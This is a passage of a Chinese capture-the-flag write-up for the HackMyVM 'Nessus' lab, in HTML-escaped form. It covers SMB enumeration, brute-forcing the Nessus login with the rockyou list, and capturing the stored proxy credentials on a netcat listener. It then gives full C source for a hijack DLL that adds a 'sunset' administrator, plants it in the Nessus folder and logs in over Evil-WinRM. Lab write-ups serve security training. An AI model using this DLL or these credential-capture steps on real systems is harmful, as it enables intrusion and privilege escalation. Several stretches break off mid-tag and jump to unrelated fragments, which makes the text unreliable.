AME_NOT_FOUND)\u003c/span\u003e\nUnable to connect with SMB1 -- no workgroup available\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e都试着访问，最后发现\u003ccode\u003eDocuments\u003c/code\u003e文件夹是可以访问的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003esmbclient \u003cspan class=\"hljs-comment\"\u003e///ADMIN$\u003c/span\u003e\nPassword \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e [WORKGROUP\\root]:\ntree connect failed: NT_STATUS_ACCESS_DENIED\n                                                                                                                                                                                                                  \n┌──(root㉿kali)-[~]\n└─\u003cspan class=\"hljs-meta\"\u003e# smbclient \u003cspan class=\"hljs-comment\"\u003e///C$    \u003c/span\u003e\u003c/span\u003e\nPassword \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e [WORKGROUP\\root]:\ntree connect failed: NT_STATUS_ACCESS_DENIED\n                                                                                                                                                                                                               \n┌──(root㉿kali)-[~]\n└─\u003cspan class=\"hljs-meta\"\u003e# smbclient \u003cspan class=\"hljs-comment\"\u003e///Documents\u003c/span\u003e\u003c/span\u003e\nPassword \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e [WORKGROUP\\root]:\nTry \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e to get a \u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e of possible commands.\nsmb: \\\u003e ls\n  .                                  DR        \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  Fri Oct \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003 Application Tests_f6jg9t.pdf of size \u003cspan class=\"hljs-number\"\u003e136025\u003c/span\u003e as Web Application Tests_f6jg9t.pdf (\u003cspan class=\"hljs-number\"\u003e2711.0\u003c/span\u003e KiloBytes/sec) (average \u003cspan class=\"hljs-number\"\u003e1484.6\u003c/span\u003e KiloBytes/sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拉取出来三个文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003edesktop.ini  \u003cspan class=\"hljs-string\"\u003e'My Basic Network Scan_hwhm7q.pdf'\u003c/span\u003e  \u003cspan class=\"hljs-string\"\u003e'Web Application Tests_f6jg9t.pdf'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ecat desktop.ini                                                          \n\n[.ShellClassInfo]\nLocalizedResourceName=@%SystemRoot%\\system32\\shell32.dll,\u003cspan class=\"hljs-number\"\u003e-21770\u003c/span\u003e\nIconResource=%SystemRoot%\\system32\\imageres.dll,\u003cspan class=\"hljs-number\"\u003e-112\u003c/span\u003e\nIconFile=%SystemRoot%\\system32\\shell32.dll\nIconIndex=\u003cspan class=\"hljs-number\"\u003e-235\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其余两个是PDF文件\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eMy Basic Network Scan_hwhm7q.pdf\u003c/code\u003e 像是扫描记录，不过\u003ccode\u003eNote\u003c/code\u003e给了说不用进行\u003ccode\u003ecve\u003c/code\u003e尝试（其实也灭扫描出来什么）\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eWeb Application Tests_f6jg9t.pdf\u003c/code\u003e 扫描出来很多个严重的漏洞，但是没看到这个被扫描的程序在哪里\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eexiftool\u003c/code\u003e来读取文件元信息，在回显的信息中看到\u003ccode\u003eAuthor\u003c/code\u003e中发现\u003ccode\u003eJose\u003c/code\u003e 用户，因为是从nessus导出的文件中读取出来的，所以可能是\u003ccode\u003enessus\u003c/code\u003e的用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eexiftool *\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nAuthor                          : Jose \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那么就可以执行爆破了\u003c/p\u003e\n\u003cp\u003e网上搜索\u003ccode\u003enessus\u003c/code\u003e用户名大多是 \u003ccode\u003eadmin\u003c/code\u003e ,\u003ccode\u003eroot\u003c/code\u003e 我们在基础上再加上作者名\u003ccode\u003ejose\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e抓取登录\u003ccode\u003enusses\u003c/code\u003e的包，然后放到\u003ccode\u003eintruder\u003c/code\u003e进行爆破\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNessus/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eusername\u003c/code\u003e位置我们仅使用\u003ccode\u003eadmin root jose\u003c/code\u003e ，\u003ccode\u003epassword\u003c/code\u003e我们使用\u003ccode\u003erockyou\u003c/code\u003e字典\u003c/p\u003e\n\u003cp\u003e很快我们就获取到一个\u003ccode\u003e200\u003c/code\u003e状态码的包了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNessus/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e用户名 \u003ccode\u003ejose\u003c/code\u003e 密码 \u003ccode\u003etequiero\u003c/code\u003e ，尝试登录\u003ccode\u003enessus\u003c/code\u003e ，登录成功\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNessus/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进去后在\u003ccode\u003eProxy Server\u003c/code\u003e中可以知道系统中存在\u003ccode\u003enesus\u003c/code\u003e用户，但是密码看不见\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMNessus/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e发现其中存在\u003ccode\u003eAuth Method\u003c/code\u003e验证方法，我们将其修改为\u003ccode\u003eBasic\u003c/code\u003e ，然后将代理服务器设置为\u003ccode\u003eKali\u003c/code\u003e的\u003ccode\u003eip\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e随后\u003ccode\u003ekali\u003c/code\u003e监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e                                                   \nlistening on [any] \u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e ...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\ n\u003e  \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e06\u003c/span\u003e PM             \u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e Nessus Web Client.url\n-a----          \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e PM          \u003cspan class=\"hljs-number\"\u003e38520\u003c/span\u003e nessus-service.exe\n-a----          \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e PM       \u003cspan class=\"hljs-number\"\u003e11143800\u003c/span\u003e nessuscli.exe\n-a----          \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e38\u003c/span\u003e PM       \u003cspan class=\"hljs-number\"\u003e11925624\u003c/span\u003e nessusd.exe\n-a----          \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e02\u003c/span\u003e PM             \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e VCRUNTIME140.dll\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e重启测试一下\u003ccode\u003enessus\u003c/code\u003e有没有启动，直接重新扫描一下端口，可以看到\u003ccode\u003e8834\u003c/code\u003e端口没有启动，所以劫持成功了\u003c/p\u003e\n\u003cpre\u0 unknown\n\u003cspan class=\"hljs-number\"\u003e49669\u003c/span\u003e/tcp open  unknown\nMAC Address: \u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003eA:\u003cspan class=\"hljs-number\"\u003e85\u003c/span\u003e:C1 (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e用\u003ccode\u003eC\u003c/code\u003e语言写一个创建\u003ccode\u003ewindows\u003c/code\u003e管理员用户的代码（来自作者的\u003ccode\u003eWP\u003c/code\u003e）也可以使用GPT生成\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e\u003cspan class=\"hljs-meta\"\u003e#\u003cspan class=\"hljs-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026#x3C;stdlib.h\u003e\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"hljs-meta\"\u003e#\u003cspan class=\"hljs-keyword\"\u003einclude\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\u0026#x3C;windows.h\u003e\u003c/span\u003e\u003c/span\u003e\n \u003cspan class=\"hljs-comment\"\u003e// COMPILE\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e// x86_64-w64-mingw32-gcc adduser.c --shared -o adduser.dll\u003c/span\u003e\nBOOL APIENTRY \u003cspan class=\"hljs-title function_\"\u003eDllMain\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(\n  HANDLE hModule, \u003cspan class=\"hljs-comment\"\u003e// Handle to DLL module\u003c/span\u003e\n  DWORD ul_reason_for_call, \u003cspan class=\"hljs-comment\"\u003e// Reason for calling function\u003c/span\u003e\n  LPVOID lpReserved)\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e// Reserved\u003c/span\u003e\n{\n  \u003cspan class=\"hljs-keyword\"\u003eswitch\u003c/span\u003e (ul_reason_for_call) {\n\t\u003cspan class=\"hljs-type\"\u003eint\u003c/span\u003e i;\n  \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e DLL_PROCESS_ATTACH: \u003cspan class=\"hljs-comment\"\u003e// A process is loading the DLL.\u003c/span\u003e\n    i = system(\u003cspan class=\"hljs-string\"\u003e\"net user sunset sunset /add\"\u003c/span\u003e);\n    i = system(\u003cspan class=\"hljs-string\"\u003e\"net localgroup administrators sunset /add\"\u003c/span\u003e);\n    i = system(\u003cspan class=\"hljs-string\"\u003e\"net localgroup 'remote management' sunset /add\"\u003c/span\u003e);\n    i = system(\u003cspan class=\"hljs-string\"\u003e\"net localgroup 'remote desktop' sunset /add\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e DLL_THREAD_ATTACH: \u003cspan class=\"hljs-comment\"\u003e// A process is creating a new thread.\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e DLL_THREAD_DETACH: \u003cspan class=\"hljs-comment\"\u003e// A thread exits normally.\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n  \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e DLL_PROCESS_DETACH: \u003cspan class=\"hljs-comment\"\u003e// A process unloads the DLL.\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n  }\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e TRUE;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将其编译为\u003ccode\u003eDLL\u003c/code\u003e文件,使用\u003ccode\u003ex86_64-w64-mingw32-gcc.exe\u003c/code\u003e 可以生成64位\u003ccode\u003ewindows\u003c/code\u003e的\u003ccode\u003eDLL\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ePS C:\\Program Files\\mingw64\\bin\u003e .\\x86_64-w64-mingw32-gcc.exe .\\adduser.c --shared -o adduser.dll -lnetapi32\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将其上传到靶机，再将名字改为\u003ccode\u003eVCRUNTIME140.dll\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e*Evil-WinRM* PS C:\\program files\\tenable\\nessus\u003e upload adduser.dll ./VCRUNTIME140.dll\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e重启检查一下用户是否创建成功，没成功…\u003c/p\u003e\n\u003cp\u003e随后尝试将劫持的DLL改为\u003ccode\u003elegacy.dll\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e*Evil-WinRM* PS C:\\program files\\tenable\\nessus\u003e mv legacy.dll legacy.dll.bak;mv VCRUNTIME140.dll legacy.dll\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e重启，尝试登录用户，成功登录！！\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eevil-winrm -i \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.8\u003c/span\u003e -u sunset -p sunset\n                                        \nEvil-WinRM shell v3.\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https:\u003cspan class=\"hljs-comment\"\u003e//github.com/Hackplayers/evil-winrm#Remote-path-completion\u003c/span\u003e\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\sunset\\Documents\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eROOT Flag\u003c/h2\u003e\n\u003cp\u003e读取\u003ccode\u003eroot flag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e*Evil-WinRM* PS C:\\Users\\administrator\\DEsktop\u003e type root.txt\nb5fc5a4ebfc20cc18220a814e1aee0aa\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e为什么劫持\u003ccode\u003eVCRUNTIME140.dll\u003c/code\u003e 会失败？\u003c/h2\u003e\n\u003cp\u003e可能的\u003c/p\u003e\n\u003cp\u003e现代操作系统或应用程序可能启用了各种防护机制（如ASLR、SafeDllSearchMode等），这些机制可能会影响DLL的加载\n如果使用 \u003ccode\u003elegacy.dll\u003c/code\u003e 成
